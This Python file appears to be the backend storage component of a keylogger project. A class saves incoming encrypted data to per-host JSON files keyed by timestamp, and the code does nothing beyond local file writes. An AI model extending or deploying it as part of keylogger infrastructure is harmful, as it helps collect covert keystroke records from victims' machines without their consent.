import json
import os
from datetime import datetime

base_directory = r"C:\devlopment\python\keyloggerProject\keyloggerBackend\data"


class WriteToNetwork:
    def __init__(self, host_name="default_host"):
        self.host_name = host_name
        self.directory = os.path.join(base_directory, self.host_name)
        if not os.path.exists(self.directory):
            os.makedirs(self.directory)
        self.file_path = os.path.join(self.directory, "data.json")


        if not os.path.exists(self.file_path):
            with open(self.file_path, "w") as file:
                json.dump({}, file)

    def load_data(self):
        if os.path.exists(self.file_path):
            with open(self.file_path, "r") as file:
                return json.load(file)
        return {}

    def save_data(self, data):
        with open(self.file_path, "w") as file:
            json.dump(data, file, indent=4)

    def add_entry(self, new_info):
        data = self.load_data()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M")

        if current_time in data:
            data[current_time].append(new_info)
        else:
            data[current_time] = [new_info]

        self.save_data(data)

    def write(self, crypto_data):

        self.add_entry(crypto_data)
